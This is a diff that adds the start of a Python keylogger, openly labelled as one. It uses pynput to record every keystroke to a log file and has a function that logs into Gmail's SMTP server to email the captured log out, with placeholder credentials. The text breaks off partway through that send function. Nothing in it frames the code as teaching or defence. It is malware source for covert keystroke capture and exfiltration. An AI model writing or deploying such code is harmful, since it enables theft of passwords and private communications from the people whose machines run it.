@@ -1,0 +1,30 @@
+# Keylogger program 
+
+import pynput
+from pynput.keyboard import Key, Listener
+import smtplib
+
+# Email address and password to send logs
+gmail_user = 'your_email@example.com'
+gmail_password = 'your_password'
+
+# Logs folder
+logs_dir = 'logs'
+
+# Function to log all keystrokes
+def log_keypress(key):
+    with open(logs_dir + "/keylog.txt", 'a') as f:
+        f.write(str(key))
+    if key == Key.esc:
+        send_logs()
+        return False
+
+# Function to send logs to email
+def send_logs():
+    try:
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(gmail_user, gmail_password)
+        with open(logs_dir + "/keylog.txt", 'rb') as f:
+            file_data = f.read()
+        server
